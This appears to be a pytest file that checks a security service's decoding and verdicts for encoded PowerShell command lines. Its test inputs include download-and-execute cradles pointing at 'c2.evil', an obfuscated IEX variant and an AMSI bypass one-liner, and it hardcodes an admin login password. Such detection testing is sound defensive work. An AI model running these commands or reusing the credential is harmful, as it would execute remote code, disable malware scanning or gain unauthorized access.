"""Phase 9.4 API contract tests — hits real POST /api/v2/auto-investigate."""
import os
import base64
import requests
import pytest

BASE_URL = os.environ.get("REACT_APP_BACKEND_URL", "https://greeting-app-5782.preview.emergentagent.com").rstrip("/")
ENDPOINT = f"{BASE_URL}/api/v2/auto-investigate"


def _login_token():
    last = None
    for _ in range(4):
        try:
            r = requests.post(f"{BASE_URL}/api/auth/login", json={
                "email": "admin@nivxray.com",
                "password": "uulVDp5cCSB3Hva99s7UUAwK",
            }, timeout=90)
            r.raise_for_status()
            return r.json().get("access_token") or r.json().get("token")
        except Exception as e:
            last = e
    raise last


@pytest.fixture(scope="module")
def auth_headers():
    tok = _login_token()
    return {"Authorization": f"Bearer {tok}", "Content-Type": "application/json"}


def _invoke(body, headers):
    # Try synchronous v2 endpoint
    resp = requests.post(ENDPOINT, json=body, headers=headers, timeout=120)
    assert resp.status_code == 200, f"HTTP {resp.status_code}: {resp.text[:400]}"
    return resp.json()


def _find_semantic_chains(data):
    dp = data.get("decode_pipeline") or (data.get("result") or {}).get("decode_pipeline") or {}
    chains = dp.get("chains") or []
    sems = [c.get("semantic") for c in chains if isinstance(c, dict) and c.get("semantic")]
    return sems


def _b64_utf16le(cmd):
    return base64.b64encode(cmd.encode("utf-16-le")).decode()


def test_encodedcommand_iex_downloadstring_populates_phase94(auth_headers):
    ps_cmd = "IEX (New-Object System.Net.WebClient).DownloadString('http://c2.evil/x.ps1')"
    enc = _b64_utf16le(ps_cmd)
    payload = {
        "incident_text": f"powershell.exe -NoP -W Hidden -ExecutionPolicy Bypass -EncodedCommand {enc}"
    }
    data = _invoke(payload, auth_headers)
    sems = _find_semantic_chains(data)
    assert sems, f"No chains[].semantic found. Keys: {list((data.get('decode_pipeline') or {}).keys())}"
    sem = sems[0]
    # Required Phase 9.4 fields
    for k in ("behaviors_v2", "decode_timeline", "verdict_breakdown", "evidence_graph", "ast_tree", "resolved_variables"):
        assert k in sem, f"Missing field: {k}. Present: {list(sem.keys())}"

    vb = sem["verdict_breakdown"]
    for sk in ("verdict", "risk_score", "behavior_score", "ioc_score", "obfuscation_score", "confidence", "rationale", "top_signals"):
        assert sk in vb, f"Missing verdict_breakdown.{sk}. Present: {list(vb.keys())}"
    assert vb["verdict"] == "malicious", f"Expected malicious verdict, got {vb['verdict']}"

    # Behaviors_v2 - names may be a list of dicts or strings
    bnames = [b.get("id") if isinstance(b, dict) else b for b in sem["behaviors_v2"]]
    bnames_lower = {str(n).lower() for n in bnames}
    for expected in ("c2_communication", "invoke_expression", "webclient_downloadstring"):
        assert expected in bnames_lower, f"Missing behavior {expected}. Got: {bnames_lower}"

    # decode_timeline structure
    for step in sem["decode_timeline"]:
        for k in ("order", "decoder", "status", "reason", "input_len", "output_len"):
            assert k in step, f"decode_timeline step missing {k}: {step}"
        assert step["status"] in ("applied", "skipped", "failed"), step["status"]
        assert step["reason"], "reason must be non-empty"

    # evidence_graph shape
    eg = sem["evidence_graph"]
    for k in ("nodes", "edges", "stats"):
        assert k in eg, f"evidence_graph missing {k}"


def test_loopback_only_is_not_malicious(auth_headers):
    ps_cmd = "Start-Process 'http://127.0.0.1:4096/'"
    enc = _b64_utf16le(ps_cmd)
    payload = {"incident_text": f"powershell.exe -EncodedCommand {enc}"}
    data = _invoke(payload, auth_headers)
    sems = _find_semantic_chains(data)
    assert sems
    sem = sems[0]
    verdict = sem["verdict_breakdown"]["verdict"]
    assert verdict in ("informational", "needs_review", "benign"), f"Loopback should not be malicious; got {verdict}"

    bnames = {(b.get("id") if isinstance(b, dict) else b).lower() for b in sem["behaviors_v2"]}
    assert "local_network_only" in bnames, f"Expected local_network_only. Got {bnames}"
    assert "external_network" not in bnames
    assert "c2_communication" not in bnames


def test_format_string_reconstruction(auth_headers):
    ps_cmd = "$a = ('{0}{1}{2}' -f 'I','E','X'); & $a (New-Object Net.WebClient).DownloadString('http://c2.evil/y')"
    enc = _b64_utf16le(ps_cmd)
    payload = {"incident_text": f"powershell.exe -EncodedCommand {enc}"}
    data = _invoke(payload, auth_headers)
    sems = _find_semantic_chains(data)
    assert sems
    bnames = {(b.get("id") if isinstance(b, dict) else b).lower() for b in sems[0]["behaviors_v2"]}
    assert "string_reconstruction" in bnames, f"Expected string_reconstruction. Got: {bnames}"


def test_amsi_bypass_text_signal(auth_headers):
    ps_cmd = "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
    enc = _b64_utf16le(ps_cmd)
    payload = {"incident_text": f"powershell.exe -EncodedCommand {enc}"}
    data = _invoke(payload, auth_headers)
    sems = _find_semantic_chains(data)
    assert sems
    bnames = {(b.get("id") if isinstance(b, dict) else b).lower() for b in sems[0]["behaviors_v2"]}
    assert "amsi_bypass" in bnames, f"Expected amsi_bypass. Got: {bnames}"


def test_backward_compat_legacy_fields_preserved(auth_headers):
    ps_cmd = "IEX (New-Object Net.WebClient).DownloadString('http://c2.evil/z')"
    enc = _b64_utf16le(ps_cmd)
    payload = {"incident_text": f"powershell.exe -EncodedCommand {enc}"}
    data = _invoke(payload, auth_headers)
    sems = _find_semantic_chains(data)
    assert sems
    sem = sems[0]
    for legacy in ("behaviors", "verdict", "confidence"):
        assert legacy in sem, f"Legacy field {legacy} removed!"
